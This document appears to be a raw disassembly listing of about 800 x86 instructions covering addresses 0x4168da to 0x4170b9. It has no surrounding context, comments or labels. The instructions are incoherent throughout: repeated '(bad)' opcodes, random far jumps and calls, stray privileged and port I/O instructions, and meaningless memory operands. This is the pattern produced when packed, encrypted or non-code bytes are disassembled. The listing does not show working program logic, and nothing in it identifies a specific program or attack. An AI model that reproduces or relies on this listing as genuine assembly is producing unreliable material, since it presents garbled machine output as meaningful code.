  4168da:	leave  
  4168db:	mov    cl,BYTE PTR [eax-0x45]
  4168de:	and    BYTE PTR [ebp+0x4c],ch
  4168e1:	push   edi
  4168e2:	fwait
  4168e3:	adc    al,0xe9
  4168e5:	shr    DWORD PTR [eax-0x3d501776],cl
  4168eb:	js     0x416903
  4168ed:	pop    ss
  4168ee:	shl    DWORD PTR [ebx+0x634d245e],cl
  4168f4:	into   
  4168f5:	pusha  
  4168f6:	pop    eax
  4168f7:	jp     0x4168a6
  4168f9:	addr16 adc esi,edi
  4168fc:	(bad)  
  4168fd:	shl    DWORD PTR [edi],cl
  4168ff:	jle    0x41692c
  416901:	loope  0x4168ff
  416903:	iret   
  416904:	cs fwait
  416906:	mov    ebx,0x7f641317
  41690b:	jae    0x4168c2
  41690d:	pop    ds
  41690e:	ss das 
  416910:	add    ch,BYTE PTR ds:[edx-0x32526c4a]
  416917:	loope  0x416994
  416919:	mov    ebp,0x58bafc96
  41691e:	mov    al,ds:0xff092d2c
  416923:	mov    bl,0x4d
  416925:	mov    cl,0x3f
  416927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416928:	push   ss
  416929:	sbb    DWORD PTR [ecx+0x10],0xffffffee
  41692d:	inc    esi
  41692e:	scas   al,BYTE PTR es:[edi]
  41692f:	lods   al,BYTE PTR ds:[esi]
  416930:	(bad)  
  416931:	int    0x1d
  416933:	mov    ecx,0x84c98ae1
  416938:	out    0x4e,eax
  41693a:	lds    eax,FWORD PTR [edx-0x3a]
  41693d:	repz add eax,0x2f236fd3
  416943:	xor    BYTE PTR [ebx-0x2f],al
  416946:	cmp    BYTE PTR [edi],bh
  416948:	add    eax,0xf571722a
  41694d:	cli    
  41694e:	or     al,0x2c
  416950:	jo     0x4168db
  416952:	dec    edx
  416953:	bound  eax,QWORD PTR [esi]
  416955:	pop    esi
  416956:	nop
  416957:	retf   
  416958:	push   0x1c
  41695a:	push   ebx
  41695b:	jmp    0x2d72:0x44d021b4
  416962:	xor    eax,0xbe047373
  416967:	das    
  416968:	mov    ds:0xa7aec4b9,al
  41696d:	jbe    0x416994
  41696f:	inc    ebx
  416970:	adc    BYTE PTR [eax-0x18],dl
  416973:	sahf   
  416974:	adc    al,0x65
  416976:	mov    DWORD PTR [eiz*4+0x5744f478],ebx
  41697d:	jbe    0x41691c
  41697f:	pop    DWORD PTR [edi+0x2dfe9cb]
  416985:	add    BYTE PTR [eax],al
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	fst    DWORD PTR [ebx]
  416995:	out    0x50,al
  416997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416998:	pop    ds
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0x770707e
  4169a0:	jmp    0x4169a6
  4169a2:	pop    edi
  4169a3:	sti    
  4169a4:	lds    eax,FWORD PTR fs:[edx+eiz*1-0x75777f6f]
  4169ac:	sar    BYTE PTR [edx],1
  4169ae:	sub    esi,esp
  4169b0:	ja     0x416963
  4169b2:	push   esp
  4169b3:	arpl   WORD PTR [ecx+0x6d],bp
  4169b6:	add    al,BYTE PTR [edi+0x8]
  4169b9:	or     al,0xee
  4169bb:	loop   0x416a01
  4169bd:	mov    dl,0xb5
  4169bf:	call   0xbd6a092f
  4169c4:	mov    dh,al
  4169c6:	xchg   edx,eax
  4169c7:	mov    eax,0xd240d910
  4169cc:	pop    ebp
  4169cd:	repnz mov DWORD PTR [ebx],ecx
  4169d0:	sbb    eax,0x6d55f2ed
  4169d5:	jge    0x416a50
  4169d7:	lahf   
  4169d8:	adc    BYTE PTR [edi],cl
  4169da:	xchg   edi,eax
  4169db:	and    bl,bl
  4169dd:	xchg   esi,eax
  4169de:	jg     0x416a29
  4169e0:	fnstsw WORD PTR [eiz*8-0x4df44750]
  4169e7:	std    
  4169e8:	fld    QWORD PTR [edi+eiz*8-0x78]
  4169ec:	adc    eax,0xf111a178
  4169f1:	cld    
  4169f2:	jmp    0xd530:0x67e9da0
  4169f9:	xchg   dl,bl
  4169fb:	adc    ecx,DWORD PTR [ebx+0x62971a5a]
  416a01:	sti    
  416a02:	jae    0x4169de
  416a04:	cmp    BYTE PTR gs:[ecx-0x73ae25ba],cl
  416a0b:	sub    dl,BYTE PTR [eax]
  416a0d:	push   0x4bfc7127
  416a12:	jbe    0x4169e8
  416a14:	mov    ch,0x7c
  416a16:	sbb    edx,DWORD PTR [ebx+0x3a6e7c85]
  416a1c:	xlat   BYTE PTR ds:[ebx]
  416a1d:	rcl    BYTE PTR [ebx],1
  416a1f:	jnp    0x4169dd
  416a21:	jnp    0x4169d8
  416a23:	push   ss
  416a24:	mov    al,0x6
  416a26:	lds    ebx,FWORD PTR [ebx+0x61]
  416a29:	cld    
  416a2a:	inc    edi
  416a2b:	loop   0x416a9a
  416a2d:	iret   
  416a2e:	xor    al,0xf
  416a30:	ja     0x416a15
  416a32:	mov    cx,0x84b5
  416a36:	icebp  
  416a37:	int    0xbe
  416a39:	add    eax,0xc7dd811c
  416a3e:	sbb    al,0x19
  416a40:	pop    DWORD PTR [edi+0x17c0f880]
  416a46:	inc    edi
  416a47:	inc    esp
  416a48:	xchg   esp,eax
  416a49:	xchg   DWORD PTR [edi-0x5d2369a8],ebx
  416a4f:	into   
  416a50:	sub    esp,ecx
  416a52:	mov    ds:0xf0e85f8e,al
  416a57:	adc    al,0xd1
  416a59:	fistp  QWORD PTR [ecx-0x4a]
  416a5c:	pop    ecx
  416a5d:	mov    dl,0xb4
  416a5f:	xor    cl,BYTE PTR [edi+0x36]
  416a62:	mov    eax,0xd36b070a
  416a67:	dec    esi
  416a68:	inc    edi
  416a69:	mov    dl,0xcb
  416a6b:	mov    ebp,0xd6363af2
  416a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a71:	out    dx,al
  416a72:	push   esi
  416a73:	sub    al,BYTE PTR [edx]
  416a75:	nop
  416a76:	es adc eax,0xe0508211
  416a7c:	xor    ecx,ebp
  416a7e:	adc    al,0x3f
  416a80:	and    eax,0xad521408
  416a85:	in     al,dx
  416a86:	bnd jl 0x416aec
  416a89:	jo     0x416aa0
  416a8b:	hlt    
  416a8c:	or     BYTE PTR [edx+edi*4-0x7e],ah
  416a90:	cmp    al,0xcd
  416a92:	pop    esp
  416a93:	sub    ecx,ebp
  416a95:	jns    0x416aa9
  416a97:	shl    DWORD PTR [ecx],cl
  416a99:	(bad)  
  416a9a:	mov    ds:0xdbcbefa6,al
  416a9f:	daa    
  416aa0:	fist   WORD PTR [esi]
  416aa2:	fst    QWORD PTR [edx-0x60]
  416aa5:	pusha  
  416aa6:	mov    ch,0xe2
  416aa8:	add    esp,DWORD PTR [eax+ecx*8-0x1a71de1c]
  416aaf:	fimul  WORD PTR [esi]
  416ab1:	or     ah,al
  416ab3:	mov    DWORD PTR [esi+0x4e],ecx
  416ab6:	enter  0x3c1f,0x61
  416aba:	push   edi
  416abb:	xchg   esp,eax
  416abc:	jbe    0x416a83
  416abe:	rcl    BYTE PTR [ecx],cl
  416ac0:	push   edi
  416ac1:	ins    BYTE PTR es:[edi],dx
  416ac2:	adc    eax,0x401bb70f
  416ac7:	xor    al,0xe
  416ac9:	(bad)  
  416aca:	in     eax,dx
  416acb:	xchg   esp,eax
  416acc:	imul   ebx,DWORD PTR [ecx+0x701bcb24],0xe4ade5d
  416ad6:	dec    ebx
  416ad7:	and    bh,BYTE PTR [ebp+0x242509a5]
  416add:	repnz aaa 
  416adf:	hlt    
  416ae0:	repnz test BYTE PTR [eax+ebp*4],bh
  416ae4:	mov    esi,0xb5b1f25b
  416ae9:	xchg   esp,eax
  416aea:	pop    edi
  416aeb:	add    eax,0xb79156e3
  416af0:	aaa    
  416af1:	std    
  416af2:	inc    ebx
  416af3:	cld    
  416af4:	cld    
  416af5:	sar    DWORD PTR [ebp+eax*2-0x57],1
  416af9:	mov    esp,0x7f24db5f
  416afe:	stos   DWORD PTR es:[edi],eax
  416aff:	xchg   esp,eax
  416b00:	lods   al,BYTE PTR ds:[esi]
  416b01:	shr    BYTE PTR [esi],0x98
  416b04:	call   0xf52b:0x29a0aeed
  416b0b:	inc    ebx
  416b0c:	bound  ebx,QWORD PTR [eax-0x229bedc0]
  416b12:	xchg   edx,eax
  416b13:	adc    eax,0xa6a9a441
  416b18:	stos   DWORD PTR es:[edi],eax
  416b19:	jae    0x416ab7
  416b1b:	jp     0x416b2b
  416b1d:	pop    edx
  416b1e:	cmp    DWORD PTR [edi-0x3045d963],0x72
  416b25:	aas    
  416b26:	test   al,0x2a
  416b28:	mov    dl,0xe5
  416b2a:	icebp  
  416b2b:	les    esp,FWORD PTR [ecx+0x3b]
  416b2e:	pop    es
  416b2f:	mov    cs,WORD PTR [ebx+0x21]
  416b32:	(bad)  
  416b33:	cdq    
  416b34:	jno    0x416b10
  416b36:	out    dx,al
  416b37:	ror    dh,1
  416b39:	pop    es
  416b3a:	sbb    DWORD PTR [ebx],edi
  416b3c:	push   ebp
  416b3d:	stc    
  416b3e:	adc    eax,0xb1496b46
  416b43:	das    
  416b44:	push   es
  416b45:	ficomp WORD PTR [eax]
  416b47:	lds    esi,FWORD PTR [ecx+0x178da665]
  416b4d:	outs   dx,DWORD PTR ds:[esi]
  416b4e:	cmp    ah,BYTE PTR [ebx]
  416b50:	sbb    ah,dl
  416b52:	pop    ecx
  416b53:	shl    ebp,1
  416b55:	rol    BYTE PTR [ebp-0x22],1
  416b58:	sti    
  416b59:	rcl    BYTE PTR [edx+edi*8+0x5c],cl
  416b5d:	fwait
  416b5e:	ror    DWORD PTR [edx+0x6d430d1e],0xac
  416b65:	fldenv [ebx-0x3b]
  416b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b69:	fidivr WORD PTR [ecx+0x68]
  416b6c:	outs   dx,BYTE PTR ds:[esi]
  416b6d:	ins    BYTE PTR es:[edi],dx
  416b6e:	loope  0x416bdd
  416b70:	sub    ch,cl
  416b72:	push   0xffffffff
  416b74:	add    eax,0x85319822
  416b79:	ficomp DWORD PTR [edx-0x29]
  416b7c:	mov    DWORD PTR [edi+0x77407351],ecx
  416b82:	repz lock jle 0x416b80
  416b86:	stc    
  416b87:	push   esp
  416b88:	es shl DWORD PTR ss:[esi],cl
  416b8c:	or     bh,BYTE PTR [eax]
  416b8e:	dec    ebx
  416b8f:	cmp    eax,0x6374fdc6
  416b94:	pop    eax
  416b95:	jp     0x416bbb
  416b97:	cmp    al,dh
  416b99:	dec    ebp
  416b9a:	(bad)  [ebp+0x644a11cd]
  416ba0:	outs   dx,DWORD PTR ds:[esi]
  416ba1:	jae    0x416b2d
  416ba3:	leave  
  416ba4:	out    dx,eax
  416ba5:	fidivr DWORD PTR [ecx-0x561540b9]
  416bab:	pop    edx
  416bac:	and    eax,0x4657ced1
  416bb1:	test   eax,0x3f8c7313
  416bb6:	sub    edi,esp
  416bb8:	push   ebx
  416bb9:	test   DWORD PTR [ebx+0x5b17a7fd],ecx
  416bbf:	sub    BYTE PTR [edx+0x75],cl
  416bc2:	out    0x7d,al
  416bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bc5:	pop    edi
  416bc6:	dec    eax
  416bc7:	xchg   ecx,eax
  416bc8:	xchg   BYTE PTR [ebx+0x3ed38a2f],bh
  416bce:	sbb    BYTE PTR [eax-0x2332d479],bh
  416bd4:	mov    edi,0xff2696a1
  416bd9:	dec    eax
  416bda:	mul    ah
  416bdc:	sub    BYTE PTR [eax-0x71],cl
  416bdf:	or     DWORD PTR [edi],ecx
  416be1:	sti    
  416be2:	xchg   BYTE PTR [ecx+0x7a],cl
  416be5:	shl    ecx,0xa6
  416be8:	sti    
  416be9:	adc    bl,ch
  416beb:	adc    al,0xad
  416bed:	imul   ecx,DWORD PTR ds:0x36baf8c2,0x59
  416bf4:	mov    ecx,0x9472519b
  416bf9:	fsubr  DWORD PTR [ebp+esi*1+0x5102489]
  416c00:	ret    
  416c01:	xor    al,0xdb
  416c03:	daa    
  416c04:	fcmove st,st(3)
  416c06:	test   DWORD PTR [ebp-0x2d],esp
  416c09:	iret   
  416c0a:	inc    edi
  416c0b:	push   ds
  416c0c:	mov    dh,BYTE PTR [edx+0x10]
  416c0f:	fnstcw WORD PTR es:[ecx+0x4215121f]
  416c16:	adc    DWORD PTR [eax+0x27988c78],edx
  416c1c:	jl     0x416c07
  416c1e:	add    al,0xfc
  416c20:	outs   dx,BYTE PTR es:[esi]
  416c22:	mov    WORD PTR [ebp-0x80],ss
  416c25:	cld    
  416c26:	sbb    bh,0x30
  416c29:	aaa    
  416c2a:	aad    0x44
  416c2c:	dec    edi
  416c2d:	push   ebx
  416c2e:	fcom   DWORD PTR [ecx-0x2f79156d]
  416c34:	jmp    0x239d31f8
  416c39:	or     edi,DWORD PTR [ebp+edx*1-0x66525f22]
  416c40:	repnz or al,0xad
  416c43:	pop    es
  416c44:	xchg   edi,eax
  416c45:	imul   edx,DWORD PTR [ebp+0x6b],0x43298ae5
  416c4c:	and    al,0xc1
  416c4e:	les    edi,FWORD PTR [edi]
  416c50:	popf   
  416c51:	cmp    bl,BYTE PTR [ecx-0x4224f7d8]
  416c57:	call   eax
  416c59:	xchg   esp,eax
  416c5a:	outs   dx,DWORD PTR ds:[esi]
  416c5b:	push   ds
  416c5c:	cli    
  416c5d:	xchg   esp,eax
  416c5e:	shl    ebx,0x83
  416c61:	test   DWORD PTR [ecx+0x1],esi
  416c64:	fwait
  416c65:	lahf   
  416c66:	dec    ecx
  416c67:	mov    eax,DWORD PTR [ebp-0x1c]
  416c6a:	jmp    0x416f4e
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	cwde   
  416c7c:	or     DWORD PTR [eiz*1+0x707f1cee],0xffffffb9
  416c84:	jle    0x416cf6
  416c86:	jo     0x416c74
  416c88:	jo     0x416c80
  416c8a:	add    BYTE PTR [eax+edx*2-0x1772aa86],0x15
  416c92:	pop    es
  416c93:	cmp    edx,DWORD PTR [ecx-0x24fba06]
  416c99:	sbb    DWORD PTR [ecx],ebp
  416c9b:	mov    DWORD PTR [esi-0x52ad36b8],ecx
  416ca1:	push   ss
  416ca2:	sbb    BYTE PTR [ebx+0x7],ah
  416ca5:	sub    edi,DWORD PTR [ecx]
  416ca7:	pop    es
  416ca8:	call   0x1f8e:0xb5c149b3
  416caf:	in     al,dx
  416cb0:	xor    esi,DWORD PTR [ebx-0x67]
  416cb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cb4:	pop    esp
  416cb5:	je     0x416c95
  416cb7:	call   esi
  416cb9:	pushf  
  416cba:	mov    ch,0x5
  416cbc:	test   eax,0x5d424e78
  416cc1:	pop    esp
  416cc2:	jbe    0x416cd4
  416cc4:	fwait
  416cc5:	ins    BYTE PTR es:[edi],dx
  416cc6:	arpl   WORD PTR ds:0x93a34d13,bp
  416ccc:	arpl   WORD PTR [edx+0xd],dx
  416ccf:	sbb    al,0xcb
  416cd1:	inc    esp
  416cd2:	jmp    0x52f40a37
  416cd7:	out    dx,al
  416cd8:	pop    edx
  416cd9:	int3   
  416cda:	(bad)  [ebx+edi*1-0x43d70551]
  416ce1:	add    ebx,DWORD PTR [esi-0x2f705902]
  416ce7:	fnsave [esp+ecx*1]
  416cea:	inc    edx
  416ceb:	xor    BYTE PTR ds:0x12b54edf,0x82
  416cf2:	rol    DWORD PTR [edx-0x1b24ce45],cl
  416cf8:	cmp    BYTE PTR [ecx+0x5244bd3],0x44
  416cff:	sbb    DWORD PTR [ebx-0x44518162],0x2e71f679
  416d09:	lods   eax,DWORD PTR ds:[esi]
  416d0a:	mul    BYTE PTR [esi-0x541aa0e9]
  416d10:	addr16 retf 
  416d12:	cdq    
  416d13:	pop    ebx
  416d14:	or     dl,BYTE PTR [esi+0x5f7b586d]
  416d1a:	pop    esp
  416d1b:	push   eax
  416d1c:	ficomp DWORD PTR [esi]
  416d1e:	test   BYTE PTR [ecx-0x79],bl
  416d21:	iret   
  416d22:	sbb    BYTE PTR [eax+0x2253761c],dh
  416d28:	xchg   esi,eax
  416d29:	retf   0x835c
  416d2c:	out    dx,eax
  416d2d:	sbb    edx,ebx
  416d2f:	add    al,0x6b
  416d31:	aaa    
  416d32:	shl    DWORD PTR [esi-0x2c],1
  416d35:	inc    eax
  416d36:	jae    0x416cdf
  416d38:	stos   BYTE PTR es:[edi],al
  416d39:	(bad)  
  416d3a:	fisubr WORD PTR [ecx]
  416d3c:	jmp    0x18d2c90d
  416d41:	xchg   esi,eax
  416d42:	leave  
  416d43:	mov    bh,0x4d
  416d45:	pusha  
  416d46:	lahf   
  416d47:	mov    edi,0xff00d6fb
  416d4c:	lods   eax,DWORD PTR ds:[esi]
  416d4d:	imul   edi,DWORD PTR [eax-0xb4e9aef],0xc07550b6
  416d57:	add    DWORD PTR [ebx-0x3b134c2d],0xffffff91
  416d5e:	add    edi,ebx
  416d60:	or     bl,BYTE PTR [edx]
  416d62:	call   0xab00:0x3b71d4ff
  416d69:	xchg   ebp,eax
  416d6a:	xor    eax,0xc9cf50fb
  416d6f:	fiadd  DWORD PTR ds:0xab998cd1
  416d75:	imul   esi,DWORD PTR [edi+esi*4-0x16],0xffffff8d
  416d7a:	test   DWORD PTR [eax+0x3f],eax
  416d7d:	xchg   ebx,eax
  416d7e:	repz pop ecx
  416d80:	and    eax,DWORD PTR [ecx-0x4b66dfa0]
  416d86:	adc    eax,DWORD PTR [edx-0x1a]
  416d89:	add    eax,eax
  416d8b:	xor    edi,ebx
  416d8d:	test   eax,0xc9f30624
  416d92:	ror    BYTE PTR [ecx],0x1a
  416d95:	call   0xc2af573b
  416d9a:	mov    al,ds:0xb38cf3ce
  416d9f:	or     edi,DWORD PTR [esp+edi*2]
  416da2:	or     esi,DWORD PTR [ebp-0x41]
  416da5:	xchg   esp,eax
  416da6:	lea    esp,[ebp+0x14cfbc9d]
  416dac:	push   esp
  416dad:	xchg   ebp,eax
  416dae:	mov    bh,ch
  416db0:	in     al,0x10
  416db2:	rcl    BYTE PTR [edi-0x4b7c6728],1
  416db8:	xchg   esi,eax
  416db9:	scas   eax,DWORD PTR es:[edi]
  416dba:	mov    ch,0xf0
  416dbc:	mov    al,0xbc
  416dbe:	and    eax,0xd67ed72
  416dc3:	(bad)  
  416dc4:	mov    ss,esp
  416dc6:	into   
  416dc7:	inc    edx
  416dc8:	nop
  416dc9:	adc    al,0xdc
  416dcb:	jmp    0x994b:0x8a26697
  416dd2:	cld    
  416dd3:	cdq    
  416dd4:	or     BYTE PTR [edi+0x48],bl
  416dd7:	ja     0x416e4b
  416dd9:	pop    ecx
  416dda:	rcr    DWORD PTR [esp+ebp*4],cl
  416ddd:	fwait
  416dde:	mov    ebp,0x74d6d818
  416de3:	pop    ds
  416de4:	stos   BYTE PTR es:[edi],al
  416de5:	cmp    eax,0xbfea1c5a
  416dea:	(bad)  
  416deb:	imul   esp,DWORD PTR [ebx+0x291a2780],0xffffffd0
  416df2:	out    0x1b,eax
  416df4:	dec    esp
  416df5:	out    dx,eax
  416df6:	cdq    
  416df7:	out    0x24,al
  416df9:	cmp    al,0x6
  416dfb:	cmp    al,BYTE PTR [ecx]
  416dfd:	daa    
  416dfe:	stc    
  416dff:	sti    
  416e00:	mov    ch,0xcd
  416e02:	pop    ss
  416e03:	ret    0x49e5
  416e06:	repz adc esi,edx
  416e09:	(bad)  [ecx+0x3e]
  416e0c:	inc    esp
  416e0d:	not    WORD PTR [ebp+edx*4-0x65]
  416e12:	mov    ecx,0xf37bbef4
  416e17:	repz inc esi
  416e19:	pop    eax
  416e1a:	pop    edx
  416e1b:	mov    edx,0xfe5644fa
  416e20:	scas   eax,DWORD PTR es:[edi]
  416e21:	adc    al,0x2b
  416e23:	adc    eax,0x40d042c8
  416e28:	lock rcl BYTE PTR [edi-0xe],cl
  416e2c:	repz std 
  416e2e:	std    
  416e2f:	jns    0x416ded
  416e31:	cmp    edx,esp
  416e33:	pop    eax
  416e35:	test   eax,0x4dd68935
  416e3a:	pop    eax
  416e3b:	push   esi
  416e3c:	repnz sbb DWORD PTR [ebx+0x64560a7e],ecx
  416e43:	fisttp WORD PTR [ecx+esi*1+0x7f]
  416e47:	or     ebp,DWORD PTR [esi+edx*1-0x1]
  416e4b:	adc    edx,eax
  416e4d:	test   eax,0x978bdd3
  416e52:	adc    BYTE PTR [ecx],ah
  416e54:	mov    dl,ch
  416e56:	pop    es
  416e57:	and    BYTE PTR [ecx],ch
  416e59:	aam    0x44
  416e5b:	cld    
  416e5c:	stos   DWORD PTR es:[edi],eax
  416e5d:	lea    ebx,[ebx+0x66615bec]
  416e63:	add    BYTE PTR [ebx-0x46],0xf6
  416e67:	fistp  WORD PTR [edi]
  416e69:	mov    ?,WORD PTR [ecx-0x19]
  416e6c:	dec    esp
  416e6d:	sub    cl,BYTE PTR [esi]
  416e6f:	sub    al,BYTE PTR [eax-0x3b33d378]
  416e75:	xor    DWORD PTR [edi+0x7c],ebx
  416e78:	jo     0x416e52
  416e7a:	repz repnz mov ecx,0x4a5f46cc
  416e81:	aas    
  416e82:	arpl   WORD PTR [ebx+0x37],bp
  416e85:	push   ebx
  416e86:	pop    ecx
  416e87:	or     dh,BYTE PTR [eax+0x10]
  416e8a:	or     esi,DWORD PTR [esi+0x1a]
  416e8d:	cmp    al,al
  416e8f:	adc    dl,ch
  416e91:	iret   
  416e92:	ds clc 
  416e94:	adc    esp,DWORD PTR [ebp-0x36]
  416e97:	mov    dl,0x1b
  416e99:	hlt    
  416e9a:	cs cmp ah,bl
  416e9d:	(bad)  [esi-0x78]
  416ea0:	shr    DWORD PTR [ecx-0x3dd59a6a],0xa7
  416ea7:	aas    
  416ea8:	mov    bh,0x1
  416eaa:	(bad)  
  416eab:	jae    0x416e4b
  416ead:	cmp    DWORD PTR [edx],edx
  416eaf:	add    al,0xd3
  416eb1:	mov    DWORD PTR [ecx+0x3],esi
  416eb4:	dec    esp
  416eb5:	pop    es
  416eb6:	out    0xbf,eax
  416eb8:	std    
  416eb9:	jge    0x416f03
  416ebb:	fcom   QWORD PTR [ebx-0x1ccab6aa]
  416ec1:	loopne 0x416f2d
  416ec3:	les    edi,FWORD PTR [ecx]
  416ec5:	daa    
  416ec6:	in     eax,0x94
  416ec8:	pop    edi
  416ec9:	mov    edx,0xe034c7ae
  416ece:	mov    dl,BYTE PTR [esi+ebp*8]
  416ed1:	mov    ds:0x6c445f85,al
  416ed6:	fadd   QWORD PTR [ebx+0x4b207e71]
  416edc:	pop    es
  416edd:	mov    al,dh
  416edf:	fcomp  QWORD PTR [edi-0xd005b5b]
  416ee5:	outs   dx,DWORD PTR ds:[esi]
  416ee6:	mov    bl,0x7a
  416ee8:	pushf  
  416ee9:	sub    ecx,DWORD PTR [edx+eax*1]
  416eec:	inc    ecx
  416eed:	jmp    0x416ec7
  416eef:	push   es
  416ef0:	mov    dl,0x24
  416ef2:	das    
  416ef3:	jl     0x416f02
  416ef5:	fs pop edx
  416ef7:	mov    ch,0x16
  416ef9:	mov    DWORD PTR ds:0xc7d9aa56,edi
  416eff:	pop    esp
  416f00:	jmp    0xe3d2:0xa577eafe
  416f07:	in     al,0xa6
  416f09:	(bad)  
  416f0c:	pop    ebx
  416f0d:	pop    ds
  416f0e:	loop   0x416f54
  416f10:	ret    
  416f11:	enter  0x9bb9,0x70
  416f15:	lea    edi,ds:0xce18fb32
  416f1b:	adc    al,0x88
  416f1d:	in     al,0xfc
  416f1f:	inc    ecx
  416f20:	jmp    0x61db:0xe9f4337a
  416f27:	popf   
  416f28:	sahf   
  416f29:	sti    
  416f2a:	push   ecx
  416f2b:	mov    dh,0xaa
  416f2d:	cli    
  416f2e:	inc    ebx
  416f2f:	pop    edi
  416f30:	pop    ss
  416f31:	hlt    
  416f32:	iret   
  416f33:	inc    eax
  416f34:	jle    0x416f87
  416f36:	int3   
  416f37:	xchg   esi,eax
  416f38:	mov    esi,0x39e5b80
  416f3d:	xor    al,0x28
  416f3f:	rol    DWORD PTR [esi],1
  416f41:	in     eax,0x23
  416f43:	lods   al,BYTE PTR ds:[esi]
  416f44:	sub    eax,0x22498645
  416f49:	or     BYTE PTR [eax+0x20],0x20
  416f4d:	dec    ebx
  416f4e:	imul   eax,ecx
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	inc    esi
  416f6b:	xor    DWORD PTR [eax+0x7f1937db],ecx
  416f71:	jo     0x416f2c
  416f73:	jle    0x416fe5
  416f75:	jo     0x416f62
  416f77:	mov    ebp,0x642665e1
  416f7c:	xchg   edx,eax
  416f7d:	cdq    
  416f7e:	mov    ah,0x87
  416f80:	rcr    BYTE PTR [eax-0x20b3399],cl
  416f86:	aad    0xa5
  416f88:	das    
  416f89:	ret    0x299d
  416f8c:	dec    edx
  416f8d:	and    eax,0x7cff6b67
  416f92:	mov    edi,0x5c95944d
  416f97:	setae  BYTE PTR [esi+0x7]
  416f9b:	mov    ch,0x28
  416f9d:	push   ss
  416f9e:	xor    cl,ch
  416fa0:	mov    DWORD PTR [ebp-0x19],ecx
  416fa3:	jge    0x416f85
  416fa5:	jno    0x416fa9
  416fa7:	outs   dx,DWORD PTR ds:[esi]
  416fa8:	dec    ebx
  416fa9:	pop    ss
  416faa:	pop    eax
  416fab:	clc    
  416fac:	pop    ss
  416fad:	call   0xb5d4:0x64c958de
  416fb4:	jne    0x416ff3
  416fb6:	imul   ebx,eax,0xffffffa6
  416fb9:	mov    edi,0x6dc3e876
  416fbe:	and    eax,0x99fb31e9
  416fc3:	or     al,0x1b
  416fc5:	sub    edx,0x2b
  416fc8:	dec    ax
  416fca:	test   al,0xb7
  416fcc:	xchg   ebx,eax
  416fcd:	ds jns 0x416fc4
  416fd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fd1:	hlt    
  416fd2:	jecxz  0x416ff4
  416fd4:	add    DWORD PTR [eax],ebp
  416fd6:	sahf   
  416fd7:	add    eax,0xdeeedb50
  416fdc:	rcl    BYTE PTR [ebx],cl
  416fde:	xrelease mov DWORD PTR [ecx+0x70],0x7d48c9b0
  416fe6:	xor    eax,0x53d43bc4
  416feb:	fs push esi
  416fed:	sbb    al,0x96
  416fef:	sbb    ch,BYTE PTR [edx+0x7c]
  416ff2:	hlt    
  416ff3:	out    0xa2,eax
  416ff5:	mov    al,ds:0xbb36bbc3
  416ffa:	popf   
  416ffb:	in     al,dx
  416ffc:	add    eax,0xe6bf1a61
  417001:	jb     0x41707b
  417003:	adc    eax,0x9d7bfb26
  417008:	out    dx,eax
  417009:	jno    0x41702c
  41700b:	out    0x75,eax
  41700d:	arpl   WORD PTR [ebp+ecx*8-0x5f],bx
  417011:	fndisi(8087 only) 
  417013:	iret   
  417014:	mov    dl,0x61
  417016:	sbb    al,0x12
  417018:	adc    dh,al
  41701a:	mov    ah,0x2f
  41701c:	dec    ecx
  41701d:	idiv   BYTE PTR [edi+0x6fe0f7ae]
  417023:	ret    0xb525
  417026:	mov    ecx,0x3ce5fdb1
  41702b:	mov    dh,0x53
  41702d:	loope  0x4170ab
  41702f:	inc    esp
  417030:	stos   DWORD PTR es:[edi],eax
  417031:	test   cl,ah
  417033:	add    DWORD PTR [edx],ecx
  417035:	fwait
  417036:	leave  
  417037:	repz push cs
  417039:	fidivr DWORD PTR [ecx+0x606dd732]
  41703f:	int3   
  417040:	js     0x417009
  417042:	push   ss
  417043:	sti    
  417044:	(bad)  
  417045:	fsub   st,st(4)
  417047:	push   ss
  417048:	mov    ah,0xca
  41704a:	push   ebp
  41704b:	sub    ah,ah
  41704d:	dec    ebx
  41704e:	jno    0x416fe9
  417050:	nop
  417051:	mov    ebp,0x5afddd62
  417056:	mov    dl,0x23
  417058:	jne    0x41708c
  41705a:	ja     0x417071
  41705c:	mov    edx,DWORD PTR [esi]
  41705e:	les    esp,FWORD PTR [eax]
  417060:	lahf   
  417061:	sub    eax,0xb567aea6
  417066:	(bad)  
  417067:	pushf  
  417068:	xor    DWORD PTR [edx+0x40368ec8],0xffffffc4
  41706f:	mov    edi,0xb1d4521f
  417074:	jns    0x417068
  417076:	xchg   ebx,eax
  417078:	loope  0x4170de
  41707a:	mov    esi,0x86b9e73e
  41707f:	or     al,0xde
  417081:	test   eax,0x1d1eb73
  417086:	retf   0x858b
  417089:	test   DWORD PTR [edx],esi
  41708b:	pop    ebx
  41708c:	in     eax,0x2d
  41708e:	sbb    esi,ebx
  417090:	enter  0x94bb,0x21
  417094:	dec    ecx
  417095:	mov    cl,0xd2
  417097:	addr16 lock mov dl,0x61
  41709b:	xor    BYTE PTR [ebx+0x3be7dfb7],ah
  4170a1:	mov    eax,0xe4311637
  4170a6:	inc    ecx
  4170a7:	cmp    bl,BYTE PTR [edi-0xe]
  4170aa:	stos   BYTE PTR es:[edi],al
  4170ab:	push   ebx
  4170ac:	jno    0x41706d
  4170ae:	sahf   
  4170af:	inc    edi
  4170b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170b1:	stos   DWORD PTR es:[edi],eax
  4170b2:	(bad)  
  4170b3:	and    al,0xfc
  4170b5:	jbe    0x417105
  4170b7:	and    dl,ah
  4170b9:	jmp    0x4170c3
